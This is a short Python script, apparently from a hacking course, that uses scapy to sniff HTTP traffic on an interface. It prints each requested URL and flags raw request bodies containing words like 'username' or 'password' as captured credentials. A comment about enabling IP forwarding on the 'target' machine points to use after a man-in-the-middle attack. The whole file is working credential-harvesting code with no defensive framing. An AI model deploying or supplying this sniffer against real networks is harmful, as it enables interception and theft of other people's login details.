#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

# echo 1 > /proc/sys/net/ipv4/ip_forward ... use if target comp cannot access internet

def sniffer(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):  # " raw request only
        load = packet[scapy.Raw].load  # print packet_name[field you want].other field you want
        keywords = ["uname", "username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load

def process_sniffed_packet(packet):
    
    if packet.haslayer(http.HTTPRequest): # single out http request only
        url = get_url(packet)
        print("[+] HTTP Request >>" + url)

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info + "\n\n")
sniffer("eth0")
